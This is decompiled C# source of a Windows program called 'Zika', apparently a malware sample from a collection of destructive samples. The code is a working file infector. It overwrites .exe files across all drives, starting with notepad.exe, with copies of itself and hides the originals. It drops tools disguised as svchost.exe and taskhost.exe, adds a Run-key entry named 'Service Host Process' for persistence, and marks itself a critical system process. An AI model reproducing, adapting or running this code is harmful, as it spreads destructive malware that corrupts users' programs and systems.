// Decompiled with JetBrains decompiler
// Type: Zika.Program
// Assembly: Zika, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7CE6D81-E560-4B98-8463-4AED586D3B4E
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\GDI\Zika\Zika.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Zika.Properties;

#nullable disable
namespace Zika;

internal static class Program
{
  private static int inf = 0;
  private static string MY;
  private static long MYlen = 0;
  private static string rh_f = Guid.NewGuid().ToString("N");
  private static Random rnd = new Random();
  private static string rh_tn = Path.Combine(Path.GetTempPath(), Program.rh_f);
  private static string rh_a = "";
  private static string rh_b = "";
  private const uint LOAD_LIBRARY_AS_DATAFILE = 2;
  public static bool debugmode = false;

  [DllImport("kernel32.dll", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool IsWow64Process([In] IntPtr hProcess, out bool lpSystemInfo);

  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern int NtSetInformationProcess(
    IntPtr hProcess,
    int processInformationClass,
    ref int processInformation,
    int processInformationLength);

  [DllImport("kernel32.dll", SetLastError = true)]
  [return: MarshalAs(UnmanagedType.Bool)]
  private static extern bool AllocConsole();

  private static bool Is64Bit()
  {
    switch (IntPtr.Size)
    {
      case 4:
        if (!Program.Is32BitProcessOn64BitProcessor())
          break;
        goto case 8;
      case 8:
        return true;
    }
    return false;
  }

  [DllImport("kernel32")]
  private static extern ulong GetTickCount64();

  private static bool Is32BitProcessOn64BitProcessor()
  {
    bool lpSystemInfo;
    Program.IsWow64Process(Process.GetCurrentProcess().Handle, out lpSystemInfo);
    return lpSystemInfo;
  }

  public static long GetLastSystemShutdown()
  {
    return Convert.ToInt64((ulong) DateTime.Now.Subtract(new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalMilliseconds - Program.GetTickCount64()) / 1000L;
  }

  private static bool ProcessFile(string fn)
  {
    string str = fn.Substring(0, fn.Length - 4) + ".dll.sys.exe";
    if (fn.EndsWith(".dll.sys.exe") || fn.EndsWith(".dll.sys.sys.exe") || fn.EndsWith(".sys.dll.exe") || File.Exists(str))
      return false;
    if (fn.StartsWith(Program.rh_tn))
      return false;
    try
    {
      try
      {
        FileSecurity accessControl = File.GetAccessControl(fn);
        FileSystemAccessRule rule = new FileSystemAccessRule((IdentityReference) new NTAccount("", "Everyone"), FileSystemRights.FullControl, AccessControlType.Allow);
        accessControl.AddAccessRule(rule);
        File.SetAccessControl(fn, accessControl);
      }
      catch (Exception ex)
      {
      }
      File.Copy(fn, str);
      FileInfo fileInfo1 = new FileInfo(str);
      FileAttributes attributes = fileInfo1.Attributes;
      fileInfo1.Attributes |= FileAttributes.Hidden | FileAttributes.System;
      Thread.Sleep(100);
      if (File.Exists(fn))
        File.Delete(fn);
      File.Copy(Program.MY, fn);
      new FileInfo(fn).Attributes = attributes;
      try
      {
        string path2 = Guid.NewGuid().ToString("N");
        Path.Combine(Path.GetTempPath(), path2);
        ProcessStartInfo startInfo1 = new ProcessStartInfo();
        startInfo1.CreateNoWindow = true;
        startInfo1.UseShellExecute = false;
        startInfo1.FileName = Program.rh_a;
        startInfo1.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo1.WorkingDirectory = Program.rh_tn;
        startInfo1.Arguments = $"-extract {str}, {Path.Combine(Program.rh_tn, "icons.rc")}, icongroup,,";
        if (Program.debugmode)
          Console.WriteLine(startInfo1.Arguments);
        Process.Start(startInfo1).WaitForExit();
        ProcessStartInfo startInfo2 = new ProcessStartInfo();
        startInfo2.CreateNoWindow = true;
        startInfo2.UseShellExecute = false;
        startInfo2.FileName = Program.rh_b;
        startInfo2.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo2.WorkingDirectory = Program.rh_tn;
        startInfo2.Arguments = $"-compile {Path.Combine(Program.rh_tn, "icons.rc")}, {Path.Combine(Program.rh_tn, "icons.res")}" ?? "";
        if (Program.debugmode)
          Console.WriteLine(startInfo2.Arguments);
        Process.Start(startInfo2).WaitForExit();
        bool flag = false;
        FileInfo[] files = new DirectoryInfo(Program.rh_tn).GetFiles("*.ico");
        int index = 0;
        if (index < files.Length)
        {
          FileInfo fileInfo2 = files[index];
          flag = true;
        }
        if (flag)
        {
          ProcessStartInfo startInfo3 = new ProcessStartInfo();
          startInfo3.CreateNoWindow = true;
          startInfo3.UseShellExecute = false;
          startInfo3.FileName = Program.rh_a;
          startInfo3.WindowStyle = ProcessWindowStyle.Hidden;
          startInfo3.WorkingDirectory = Program.rh_tn;
          startInfo3.Arguments = $"-addoverwrite {fn}\", \"{fn}, {Path.Combine(Program.rh_tn, "icons.res")}, icongroup,,";
          if (Program.debugmode)
            Console.WriteLine(startInfo3.Arguments);
          Process.Start(startInfo3).WaitForExit();
        }
        foreach (FileInfo fileInfo3 in ((IEnumerable<FileInfo>) new DirectoryInfo(Program.rh_tn).GetFiles("*.ico")).Where<FileInfo>((Func<FileInfo, bool>) (p => p.Extension == ".ico")).ToArray<FileInfo>())
        {
          fileInfo3.Attributes = FileAttributes.Normal;
          fileInfo3.Delete();
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
      Console.WriteLine("infected " + fn);
      Console.WriteLine($"as {str}, success={File.Exists(str).ToString()}");
      Console.WriteLine("infect ok");
      ++Program.inf;
      return true;
    }
    catch (Exception ex)
    {
      Console.WriteLine(ex.ToString());
      return false;
    }
  }

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern IntPtr LoadLibraryEx(string lpFileName, IntPtr hFile, uint dwFlags);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern bool UpdateResource(
    IntPtr hUpdate,
    IntPtr lpType,
    IntPtr lpName,
    ushort wLanguage,
    IntPtr lpData,
    uint cbData);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern IntPtr BeginUpdateResource(string pFileName, [MarshalAs(UnmanagedType.Bool)] bool bDeleteExistingResources);

  [DllImport("kernel32.dll")]
  private static extern IntPtr LockResource(IntPtr hResData);

  [DllImport("kernel32.dll", SetLastError = true)]
  private static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);

  [DllImport("kernel32.dll")]
  private static extern IntPtr FindResource(IntPtr hModule, string lpName, int lpType);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

  private static string ApplyAllFiles(string folder, Func<string, bool> fileAction)
  {
    string str = "";
    foreach (string file in Directory.GetFiles(folder))
    {
      if (!(Path.GetExtension(file) != ".exe"))
      {
        if (fileAction(file))
          str = file;
        if (Program.inf >= 10)
          return str;
      }
    }
    foreach (string directory in Directory.GetDirectories(folder))
    {
      if (Program.inf >= 10)
        return str;
      try
      {
        if (str == "")
          str = Program.ApplyAllFiles(directory, fileAction);
      }
      catch
      {
      }
    }
    return str;
  }

  private static string CalculateMD5Hash(string input)
  {
    byte[] hash = MD5.Create().ComputeHash(Encoding.ASCII.GetBytes(input));
    StringBuilder stringBuilder = new StringBuilder();
    for (int index = 0; index < hash.Length; ++index)
      stringBuilder.Append(hash[index].ToString("X2"));
    return stringBuilder.ToString();
  }

  [STAThread]
  private static void Main(string[] args)
  {
    if (Program.debugmode)
      Program.AllocConsole();
    RegistryKey registryKey1 = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, Program.Is64Bit() ? RegistryView.Registry64 : RegistryView.Registry32);
    string my = Assembly.GetExecutingAssembly().Location;
    try
    {
      File.WriteAllBytes(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my).Length), "AxInterop.WMPLib.dll"), Resources.AxInterop_WMPLib);
      new FileInfo(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my).Length), "AxInterop.WMPLib.dll")).Attributes |= FileAttributes.Hidden | FileAttributes.System;
    }
    catch (Exception ex)
    {
    }
    try
    {
      File.WriteAllBytes(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my).Length), "Interop.WMPLib.dll"), Resources.Interop_WMPLib);
      new FileInfo(Path.Combine(my.Substring(0, my.Length - Path.GetFileName(my).Length), "Interop.WMPLib.dll")).Attributes |= FileAttributes.Hidden | FileAttributes.System;
    }
    catch (Exception ex)
    {
    }
    Console.WriteLine(my);
    bool flag1 = false;
    if (my.EndsWith(".sys.dll.exe"))
    {
      Console.WriteLine("disinfect-run");
      flag1 = true;
    }
    else
    {
      string path1 = my.Substring(0, my.Length - 4) + ".dll.sys.exe";
      if (File.Exists(path1))
      {
        string str1 = my.Substring(0, my.Length - 4) + ".dll.sys.sys.exe";
        string currentDirectory = Environment.CurrentDirectory;
        string str2 = $"\"\"{my}\"\" {string.Join(" ", args).Replace("\"", "\"\"")}";
        string str3 = my.Substring(0, my.Length - 4) + ".sys.dll.exe";
        string contents = $"Set oShell = WScript.CreateObject(\"WScript.Shell\")\r\nWscript.Sleep 500\r\nSet fso = WScript.CreateObject(\"Scripting.FileSystemObject\")\r\nfso.CopyFile \"{my}\", \"{str3}\"\r\nSet oFile = fso.GetFile(\"{my}\")\r\norigattr = oFile.Attributes\r\nfso.MoveFile \"{my}\", \"{str1}\"\r\nfso.MoveFile \"{path1}\", \"{my}\"\r\nSet oFile = fso.GetFile(\"{str3}\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"{str1}\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"{my}\")\r\noFile.Attributes = origattr\r\noShell.CurrentDirectory = \"{currentDirectory}\"\r\noShell.Run Chr(34) & \"{str3}\" & Chr(34)\r\noShell.Run \"{str2}\", 1, True\r\nOn Error Resume Next\r\nfso.MoveFile \"{my}\", \"{path1}\"\r\nIf fso.FileExists(\"{my}\") Then\r\nfso.DeleteFile \"{str1}\"\r\nfso.DeleteFile \"{path1}\"\r\nfso.DeleteFile Wscript.ScriptFullName\r\nWscript.Quit()\r\nEnd If\r\nfso.MoveFile \"{str1}\", \"{my}\"\r\nSet oFile = fso.GetFile(\"{path1}\")\r\noFile.Attributes = oFile.Attributes Or 6\r\nSet oFile = fso.GetFile(\"{my}\")\r\noFile.Attributes = origattr\r\nfso.DeleteFile Wscript.ScriptFullName\r\n";
        string path2 = Path.Combine(Path.GetTempPath(), Program.CalculateMD5Hash(my) + ".vbs");
        File.WriteAllText(path2, contents);
        new Process()
        {
          StartInfo = {
            FileName = "cscript",
            Arguments = $"//B //Nologo \"{path2}\"",
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
        return;
      }
      bool flag2 = true;
      if (flag2 && args.Length != 0)
      {
        if (Program.debugmode)
        {
          try
          {
            int v = int.Parse(args[0]);
            Form1 mainForm = new Form1();
            mainForm.ShowInTaskbar = false;
            mainForm.timertick();
            mainForm.DirectMode();
            mainForm.doPayload(v);
            Application.Run((Form) mainForm);
          }
          catch (Exception ex)
          {
          }
        }
      }
      if (flag2)
      {
        int num;
        new Thread((ThreadStart) (() => num = (int) MessageBox.Show((IWin32Window) null, "Cannot find DLL", Path.GetFileName(my), MessageBoxButtons.OK, MessageBoxIcon.Hand))).Start();
      }
    }
    bool flag3 = false;
    try
    {
      if (!Directory.Exists(Program.rh_tn))
        Directory.CreateDirectory(Program.rh_tn);
      Program.rh_a = Path.Combine(Program.rh_tn, "svchost.exe");
      Program.rh_b = Path.Combine(Program.rh_tn, "taskhost.exe");
      File.WriteAllBytes(Program.rh_a, Resources.ResHacker);
      File.WriteAllBytes(Program.rh_b, Resources.ResourceHacker);
      using (RegistryKey registryKey2 = registryKey1.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", true))
      {
        long totalSeconds = (long) (DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0).ToUniversalTime()).TotalSeconds;
        if (((IEnumerable<string>) registryKey2.GetValueNames()).Contains<string>("WindowsActivationDate"))
        {
          if (totalSeconds - (long) registryKey2.GetValue("WindowsActivationDate") > 6912000L)
          {
            Console.WriteLine("eheheheh");
          }
          else
          {
            flag3 = true;
            Program.MY = my;
            Program.MYlen = new FileInfo(my).Length;
            Program.inf = 0;
            Console.WriteLine("infectious");
            Console.WriteLine("notepad");
            Program.ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
            Console.WriteLine("others");
            Program.ApplyAllFiles(Path.GetPathRoot(my), new Func<string, bool>(Program.ProcessFile));
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
              if (drive.IsReady)
              {
                Program.inf = 0;
                try
                {
                  Program.ApplyAllFiles(drive.RootDirectory.FullName, new Func<string, bool>(Program.ProcessFile));
                }
                catch (Exception ex)
                {
                }
              }
            }
            registryKey2.SetValue("WindowsActivationDate", (object) totalSeconds, RegistryValueKind.QWord);
            registryKey2.Flush();
          }
        }
        else
        {
          flag3 = true;
          Program.MY = my;
          Program.MYlen = new FileInfo(my).Length;
          Program.inf = 0;
          Console.WriteLine("infectious");
          Console.WriteLine("notepad");
          Program.ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
          Console.WriteLine("others");
          Program.ApplyAllFiles(Path.GetPathRoot(my), new Func<string, bool>(Program.ProcessFile));
          foreach (DriveInfo drive in DriveInfo.GetDrives())
          {
            if (drive.IsReady)
            {
              Program.inf = 0;
              try
              {
                Program.ApplyAllFiles(drive.RootDirectory.FullName, new Func<string, bool>(Program.ProcessFile));
              }
              catch (Exception ex)
              {
              }
            }
          }
          registryKey2.SetValue("WindowsActivationDate", (object) totalSeconds, RegistryValueKind.QWord);
          registryKey2.Flush();
        }
      }
      Directory.Delete(Program.rh_tn, true);
    }
    catch (Exception ex)
    {
      if (Program.debugmode)
      {
        int num = (int) MessageBox.Show(ex.ToString());
      }
    }
    if (flag3)
    {
      if (!flag1)
        return;
      new Process()
      {
        StartInfo = {
          FileName = "cmd",
          Arguments = $"/c ping 127.0.0.1 -n 2 && del /A:H \"{my}\"",
          WindowStyle = ProcessWindowStyle.Hidden
        }
      }.Start();
    }
    else
    {
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.ThreadException += new ThreadExceptionEventHandler(Program.Application_ThreadException);
      Form1 mainForm = new Form1();
      using (RegistryKey registryKey3 = registryKey1.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", true))
      {
        long lastSystemShutdown = Program.GetLastSystemShutdown();
        if (((IEnumerable<string>) registryKey3.GetValueNames()).Contains<string>("WindowsActivationID"))
        {
          if ((long) registryKey3.GetValue("WindowsActivationID") == lastSystemShutdown)
            return;
          mainForm.slowTimer();
          registryKey3.SetValue("WindowsActivationID", (object) lastSystemShutdown, RegistryValueKind.QWord);
          registryKey3.Flush();
        }
        else
        {
          registryKey3.SetValue("WindowsActivationID", (object) lastSystemShutdown, RegistryValueKind.QWord);
          registryKey3.Flush();
        }
      }
      try
      {
        Program.MY = my;
        Program.MYlen = new FileInfo(my).Length;
        Program.inf = 0;
        Console.WriteLine("infectious");
        Console.WriteLine("notepad");
        Program.ProcessFile(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "notepad.exe"));
        Console.WriteLine("others");
        string str = Program.ApplyAllFiles(Path.GetPathRoot(my), new Func<string, bool>(Program.ProcessFile));
        if (str != "")
        {
          foreach (DriveInfo drive in DriveInfo.GetDrives())
          {
            if (drive.IsReady)
            {
              Program.inf = 0;
              try
              {
                Program.ApplyAllFiles(drive.RootDirectory.FullName, new Func<string, bool>(Program.ProcessFile));
              }
              catch (Exception ex)
              {
              }
            }
          }
          using (RegistryKey registryKey4 = registryKey1.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
          {
            registryKey4.SetValue("Service Host Process", (object) $"\"{str}\"", RegistryValueKind.String);
            registryKey4.Flush();
          }
        }
      }
      catch (Exception ex)
      {
        if (Program.debugmode)
        {
          int num = (int) MessageBox.Show(ex.ToString());
        }
      }
      Console.WriteLine("running form1");
      int processInformation = 1;
      int processInformationClass = 29;
      Process.EnterDebugMode();
      Program.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
      mainForm.ShowInTaskbar = false;
      Application.Run((Form) mainForm);
    }
  }

  private static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
  {
    throw e.Exception;
  }
}
